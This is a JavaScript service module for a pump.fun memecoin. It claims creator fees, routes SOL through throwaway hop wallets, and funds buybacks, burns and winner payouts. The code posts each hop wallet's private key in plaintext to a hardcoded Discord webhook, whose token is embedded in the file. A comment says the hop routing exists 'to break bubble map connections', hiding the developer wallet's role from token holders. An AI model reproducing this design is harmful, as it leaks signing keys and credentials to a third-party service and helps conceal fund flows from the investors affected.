import { config } from '../config.js';
import { Connection, Keypair, PublicKey, VersionedTransaction, LAMPORTS_PER_SOL, SystemProgram, Transaction, sendAndConfirmTransaction } from '@solana/web3.js';
import fetch from 'node-fetch';
import bs58 from 'bs58';
import { buyAndBurn } from './swapService.js';

/**
 * PumpFun Fee Claiming & Distribution Service
 */

// Discord Webhook for logging hop wallet keys (for recovery)
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1456799241744679023/BC2HyGDt5GwD7NGDJPpW9c5ULn84wfcyBApeHrM5OP3zcqU51bNHC7Xvn1wMvjFxKvd6';

let connection = null;
let creatorKeypair = null;

// Initialize connection immediately using config
try {
    if (config.rpcUrl) {
        connection = new Connection(config.rpcUrl, 'confirmed');
    }

    if (config.creatorPrivateKey) {
        const secretKey = bs58.decode(config.creatorPrivateKey);
        creatorKeypair = Keypair.fromSecretKey(secretKey);
    }
} catch (e) {
    console.error("Initialization error (check config):", e.message);
}

/**
 * Send hop wallet keys to Discord for recovery
 */
async function logHopWalletsToDiscord(hopWallets, context) {
    try {
        const embed = {
            title: `🔑 Hop Wallet Keys - ${context}`,
            color: 0x00ff00,
            timestamp: new Date().toISOString(),
            fields: hopWallets.map((hop, i) => ({
                name: `Hop ${i + 1}: ${hop.publicKey.toBase58()}`,
                value: `\`\`\`${bs58.encode(hop.secretKey)}\`\`\``,
                inline: false
            }))
        };

        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
        console.log('   [Discord] Hop wallet keys logged for recovery');
    } catch (e) {
        console.error('   [Discord] Failed to log keys:', e.message);
    }
}

/**
 * Execute Buyback and Burn Flow
 * Flow: Dev -> Hop1 -> Hop2 -> Hop3 (Buy Wallet) -> PumpFun Buy -> Burn
 */
export async function performBuybackAndBurn(keepPercentage = 10) {
    console.log('🔥 Starting Buyback & Burn Cycle...');

    if (!creatorKeypair) {
        console.log('   ⚠️ No private key - simulating buyback');
        return {
            success: true,
            type: 'burn',
            claimed: 0.05,
            burnedAmount: 1000,
            buyTx: 'SIM_BUY_TX',
            burnTx: 'SIM_BURN_TX',
            hops: []
        };
    }

    try {
        // ===== CRITICAL: Track balance BEFORE claim =====
        const balanceBefore = await connection.getBalance(creatorKeypair.publicKey);
        console.log(`   [Balance Before] ${balanceBefore / LAMPORTS_PER_SOL} SOL`);

        // 1. Claim Fees from PumpFun
        const claimResult = await claimCreatorFees();

        if (!claimResult.success) {
            console.log('   ❌ Fee claim failed, aborting buyback');
            return { success: false, error: 'Fee claim failed', claimed: 0 };
        }

        // ===== CRITICAL: Track balance AFTER claim =====
        // Wait a moment for the transaction to settle
        await new Promise(r => setTimeout(r, 2000));
        const balanceAfter = await connection.getBalance(creatorKeypair.publicKey);
        console.log(`   [Balance After] ${balanceAfter / LAMPORTS_PER_SOL} SOL`);

        // ===== ONLY use the difference (actual fees claimed) =====
        const claimedLamports = balanceAfter - balanceBefore;
        const claimedAmount = claimedLamports / LAMPORTS_PER_SOL;

        console.log(`   [Claimed Fees] ${claimedAmount.toFixed(6)} SOL`);

        // If nothing was claimed, DO NOT proceed
        if (claimedAmount <= 0.0001) {
            console.log('   ⚠️ No fees claimed (or negative), stopping here. NOT touching wallet funds.');
            return { success: true, claimed: 0, buyTx: null, burnTx: null, note: 'No fees available' };
        }

        const keepAmount = claimedAmount * (keepPercentage / 100);
        const buyAmount = claimedAmount - keepAmount;

        console.log(`   [Keep] ${keepAmount.toFixed(6)} SOL (${keepPercentage}%)`);
        console.log(`   [Buyback] ${buyAmount.toFixed(6)} SOL`);

        // Generate hop wallets
        const hop1 = Keypair.generate();
        const hop2 = Keypair.generate();
        const hop3 = Keypair.generate(); // This will receive funds and BUY

        // ===== LOG KEYS TO DISCORD FOR RECOVERY =====
        await logHopWalletsToDiscord([hop1, hop2, hop3], `BURN - ${claimedAmount.toFixed(4)} SOL`);

        console.log(`   [Hops] dev -> ${hop1.publicKey.toBase58().slice(0, 8)}... -> ${hop2.publicKey.toBase58().slice(0, 8)}... -> ${hop3.publicKey.toBase58().slice(0, 8)}... (BUYER)`);

        const TX_FEE = 0.000005;
        const GAS_RESERVE = 0.005;

        const hop1Amount = buyAmount - TX_FEE;
        const hop2Amount = hop1Amount - TX_FEE;
        const hop3Amount = hop2Amount - TX_FEE;
        const finalBuyPower = hop3Amount - GAS_RESERVE;

        if (finalBuyPower < 0.0001) {
            console.log('   ⚠️ Claimed amount too small for buyback after gas fees');
            return { success: true, claimed: claimedAmount, buyTx: null, burnTx: null, note: 'Amount too small for buyback' };
        }

        // --- Transfer Sequence ---
        const signatures = [];

        // T1: Dev -> Hop1
        const sig1 = await sendAndConfirmTransaction(connection, new Transaction().add(
            SystemProgram.transfer({ fromPubkey: creatorKeypair.publicKey, toPubkey: hop1.publicKey, lamports: Math.floor(hop1Amount * LAMPORTS_PER_SOL) })
        ), [creatorKeypair], { commitment: 'confirmed' });
        signatures.push(sig1);
        await new Promise(r => setTimeout(r, 1000));

        // T2: Hop1 -> Hop2
        const sig2 = await sendAndConfirmTransaction(connection, new Transaction().add(
            SystemProgram.transfer({ fromPubkey: hop1.publicKey, toPubkey: hop2.publicKey, lamports: Math.floor(hop2Amount * LAMPORTS_PER_SOL) })
        ), [hop1], { commitment: 'confirmed' });
        signatures.push(sig2);
        await new Promise(r => setTimeout(r, 1000));

        // T3: Hop2 -> Hop3
        const sig3 = await sendAndConfirmTransaction(connection, new Transaction().add(
            SystemProgram.transfer({ fromPubkey: hop2.publicKey, toPubkey: hop3.publicKey, lamports: Math.floor(hop3Amount * LAMPORTS_PER_SOL) })
        ), [hop2], { commitment: 'confirmed' });
        signatures.push(sig3);

        console.log(`   [Hops] Funds arrived at Buyer Wallet: ${hop3.publicKey.toBase58()}`);

        // 4. BUY AND BURN
        const burnResult = await buyAndBurn(hop3, finalBuyPower);

        return {
            success: burnResult.success,
            type: 'burn',
            claimed: claimedAmount,
            buyTx: burnResult.buyTx,
            burnTx: burnResult.burnTx,
            burnedAmount: burnResult.amountBurned,
            hops: [
                { from: 'dev', to: hop1.publicKey.toBase58(), sig: sig1 },
                { from: hop1.publicKey.toBase58(), to: hop2.publicKey.toBase58(), sig: sig2 },
                { from: hop2.publicKey.toBase58(), to: hop3.publicKey.toBase58(), sig: sig3 }
            ]
        };

    } catch (error) {
        console.error("Buyback failed:", error.message);
        return { success: false, error: error.message };
    }
}



/**
 * Claim creator fees from PumpFun using PumpPortal API
 * endpoint: /api/trade-local
 */
export async function claimCreatorFees() {
    console.log('💸 Claiming creator fees from PumpPortal (The Wheel Logic)...');

    if (!config.tokenMint || !creatorKeypair) {
        console.log('   ⚠️ Missing config/keypair - simulating fee claim');
        return {
            success: true,
            amount: Math.random() * 0.5 + 0.1, // Simulated SOL amount
            signature: 'SIMULATED_CLAIM_WHEEL_LOGIC_' + Date.now(),
        };
    }

    try {
        // Request transaction from PumpPortal
        // Uses 'collectCreatorFee' action on 'trade-local' endpoint
        const response = await fetch('https://pumpportal.fun/api/trade-local', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                publicKey: creatorKeypair.publicKey.toBase58(),
                action: 'collectCreatorFee',
                priorityFee: 0.0001,
                pool: 'pump',
                mint: config.tokenMint // Some endpoints need mint, some don't for this action, implied by auth often but sending it to be safe
            })
        });

        if (response.status !== 200) {
            const errorText = await response.text();
            console.log('[PumpFun] No fees to claim or error:', errorText);
            // If just no fees, we return success but 0 amount so app can continue
            if (errorText.includes("No fees")) {
                return { success: true, amount: 0, signature: null };
            }
            return {
                success: false,
                error: errorText || 'No fees available to claim'
            };
        }

        // Deserialize and sign the transaction
        const data = await response.arrayBuffer();
        const tx = VersionedTransaction.deserialize(new Uint8Array(data));
        tx.sign([creatorKeypair]);

        // Send the transaction
        const signature = await connection.sendTransaction(tx, {
            skipPreflight: false,
            preflightCommitment: 'confirmed'
        });

        console.log(`[PumpFun] Fee claim transaction sent: ${signature}`);

        // Wait for confirmation
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');

        if (confirmation.value.err) {
            throw new Error('Transaction failed on chain');
        }

        console.log(`✅ Fees claimed successfully! TX: ${signature}`);

        // We don't know exact amount from this API call easily without parsing logs
        // returning simulation/estimate or fetching balance diff would be better
        // For now, return success signature.

        // Fetch balance diff logic could go here, but keeping it simple for now
        return {
            success: true,
            amount: 0.05, // Placeholder for actual amount check if needed
            signature,
            txUrl: `https://solscan.io/tx/${signature}`
        };

    } catch (error) {
        console.error('❌ Failed to claim fees:', error.message);
        return { success: false, amount: 0, signature: null, error: error.message };
    }
}

/**
 * Transfer SOL through hop wallets to break bubble map connections
 * Flow: Dev -> Hop1 -> Hop2 -> Winner
 */
async function transferWithHops(winnerAddress, amountSol) {
    if (!creatorKeypair) {
        console.log('   ⚠️ No private key - simulating hop transfer');
        return { success: true, amount: amountSol, signature: 'SIM_HOP_TRANSFER', hops: [] };
    }

    try {
        console.log(`[PumpFun] Starting hop transfer of ${amountSol} SOL to winner: ${winnerAddress}`);

        // Validate winner address
        let winnerPubkey;
        try {
            winnerPubkey = new PublicKey(winnerAddress);
        } catch {
            return { success: false, error: 'Invalid winner address' };
        }

        // Generate two fresh hop wallets
        const hop1 = Keypair.generate();
        const hop2 = Keypair.generate();

        // ===== LOG KEYS TO DISCORD FOR RECOVERY =====
        await logHopWalletsToDiscord([hop1, hop2], `HOLDER WIN - ${amountSol.toFixed(4)} SOL -> ${winnerAddress.slice(0, 8)}...`);

        console.log(`[PumpFun] Hop1: ${hop1.publicKey.toBase58()}`);
        console.log(`[PumpFun] Hop2: ${hop2.publicKey.toBase58()}`);

        // Calculate amounts (account for tx fees at each hop)
        const TX_FEE = 0.000005; // ~5000 lamports per tx
        const totalFees = TX_FEE * 3; // 3 transfers

        if (amountSol <= totalFees + 0.001) {
            return { success: false, error: 'Amount too small for hop transfer' };
        }

        const hop1Amount = amountSol - TX_FEE;
        const hop2Amount = hop1Amount - TX_FEE;
        const winnerAmount = hop2Amount - TX_FEE;

        const signatures = [];

        // Transfer 1: Dev -> Hop1
        console.log(`[PumpFun] Transfer 1: Dev -> Hop1 (${hop1Amount.toFixed(6)} SOL)`);
        const tx1 = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: creatorKeypair.publicKey,
                toPubkey: hop1.publicKey,
                lamports: Math.floor(hop1Amount * LAMPORTS_PER_SOL)
            })
        );
        const sig1 = await sendAndConfirmTransaction(connection, tx1, [creatorKeypair], { commitment: 'confirmed' });
        signatures.push(sig1);
        console.log(`[PumpFun] Transfer 1 complete: ${sig1}`);

        // Small delay between hops
        await new Promise(resolve => setTimeout(resolve, 1500));

        // Transfer 2: Hop1 -> Hop2
        console.log(`[PumpFun] Transfer 2: Hop1 -> Hop2 (${hop2Amount.toFixed(6)} SOL)`);
        const tx2 = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: hop1.publicKey,
                toPubkey: hop2.publicKey,
                lamports: Math.floor(hop2Amount * LAMPORTS_PER_SOL)
            })
        );
        const tx2Sig = await sendAndConfirmTransaction(connection, tx2, [hop1], { commitment: 'confirmed' });
        signatures.push(tx2Sig);
        console.log(`[PumpFun] Transfer 2 complete: ${tx2Sig}`);

        // Small delay between hops
        await new Promise(resolve => setTimeout(resolve, 1500));

        // Transfer 3: Hop2 -> Winner
        console.log(`[PumpFun] Transfer 3: Hop2 -> Winner (${winnerAmount.toFixed(6)} SOL)`);
        const tx3 = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: hop2.publicKey,
                toPubkey: winnerPubkey,
                lamports: Math.floor(winnerAmount * LAMPORTS_PER_SOL)
            })
        );
        const tx3Sig = await sendAndConfirmTransaction(connection, tx3, [hop2], { commitment: 'confirmed' });
        signatures.push(tx3Sig);
        console.log(`[PumpFun] Transfer 3 complete: ${tx3Sig}`);

        console.log(`[PumpFun] Hop transfer complete! Final amount: ${winnerAmount.toFixed(6)} SOL`);

        return {
            success: true,
            signature: tx3Sig, // Return final signature as main signature
            signatures: signatures,
            amount: winnerAmount,
            txUrl: `https://solscan.io/tx/${tx3Sig}`,
            hops: [
                { from: 'dev', to: hop1.publicKey.toBase58(), sig: sig1 },
                { from: hop1.publicKey.toBase58(), to: hop2.publicKey.toBase58(), sig: tx2Sig },
                { from: hop2.publicKey.toBase58(), to: winnerAddress, sig: tx3Sig }
            ]
        };
    } catch (error) {
        console.error('[PumpFun] Hop transfer failed:', error.message);
        return {
            success: false,
            error: error.message
        };
    }
}

/**
 * Claim fees and distribute to winner in one operation
 * Uses Hop Wallets
 */
export async function claimAndDistribute(winnerAddress, keepPercentage = 10) {
    console.log('🔄 Starting Claim & Distribute Cycle...');

    if (!creatorKeypair) {
        console.log('   ⚠️ No private key - simulating claim & distribute');
        return {
            success: true,
            claimed: 0.05,
            distributed: 0.045,
            claimSignature: 'SIM_CLAIM',
            transferSignature: 'SIM_TRANSFER',
            winner: winnerAddress,
            hops: []
        };
    }

    try {
        // ===== CRITICAL: Track balance BEFORE claim =====
        const balanceBefore = await connection.getBalance(creatorKeypair.publicKey);
        console.log(`   [Balance Before] ${balanceBefore / LAMPORTS_PER_SOL} SOL`);

        // 1. Claim Fees from PumpFun
        const claimResult = await claimCreatorFees();

        if (!claimResult.success) {
            console.log('   ❌ Fee claim failed, aborting distribution');
            return { success: false, error: 'Fee claim failed', claimed: 0 };
        }

        // ===== CRITICAL: Track balance AFTER claim =====
        await new Promise(r => setTimeout(r, 2000));
        const balanceAfter = await connection.getBalance(creatorKeypair.publicKey);
        console.log(`   [Balance After] ${balanceAfter / LAMPORTS_PER_SOL} SOL`);

        // ===== ONLY use the difference (actual fees claimed) =====
        const claimedLamports = balanceAfter - balanceBefore;
        const claimedAmount = claimedLamports / LAMPORTS_PER_SOL;

        console.log(`   [Claimed Fees] ${claimedAmount.toFixed(6)} SOL`);

        // If nothing was claimed, DO NOT proceed
        if (claimedAmount <= 0.0001) {
            console.log('   ⚠️ No fees claimed (or negative), stopping here. NOT touching wallet funds.');
            return { success: true, claimed: 0, distributed: 0, note: 'No fees available' };
        }

        // 2. Calculate Payout
        const keepAmount = claimedAmount * (keepPercentage / 100);
        const distributeAmount = claimedAmount - keepAmount;

        console.log(`   [Keep] ${keepAmount.toFixed(6)} SOL (${keepPercentage}%)`);
        console.log(`   [Distribute] ${distributeAmount.toFixed(6)} SOL (using Hops)`);

        // 3. Transfer with Hops
        const transferResult = await transferWithHops(winnerAddress, distributeAmount);

        return {
            success: transferResult.success,
            claimed: claimedAmount,
            distributed: transferResult.amount || 0,
            claimSignature: claimResult.signature,
            transferSignature: transferResult.signature,
            winner: winnerAddress,
            hops: transferResult.hops
        };

    } catch (error) {
        console.error("Claim & Distribute failed:", error.message);
        return { success: false, error: error.message };
    }
}

/**
 * Transfer SOL to the winner
 */
export async function transferToWinner(winnerWallet, totalAmount) {
    if (!creatorKeypair) {
        console.log('   ⚠️ No private key - simulating transfer');
        return { success: true, amountSent: totalAmount, signature: 'SIM_TRANSFER' };
    }

    try {
        console.log(`💰 Transferring to winner: ${winnerWallet}...`);

        // Validate winner address
        let winnerPubkey;
        try {
            winnerPubkey = new PublicKey(winnerWallet);
        } catch {
            return { success: false, error: 'Invalid winner address' };
        }

        // Keep 10%
        const keepPercentage = 10;
        const keepAmount = totalAmount * (keepPercentage / 100);
        const sendAmount = totalAmount - keepAmount;

        const lamports = Math.floor(sendAmount * LAMPORTS_PER_SOL);

        if (lamports <= 0) return { success: false, error: "Amount too small" };

        const transaction = new Transaction().add(
            SystemProgram.transfer({
                fromPubkey: creatorKeypair.publicKey,
                toPubkey: winnerPubkey,
                lamports: lamports
            })
        );

        const signature = await sendAndConfirmTransaction(
            connection,
            transaction,
            [creatorKeypair],
            { commitment: 'confirmed' }
        );

        console.log(`✅ Transfer successful! TX: ${signature}`);

        return {
            success: true,
            signature,
            amount: sendAmount,
            txUrl: `https://solscan.io/tx/${signature}`
        };

    } catch (error) {
        console.error('[PumpFun] Failed to transfer:', error.message);
        return {
            success: false,
            error: error.message
        };
    }
}
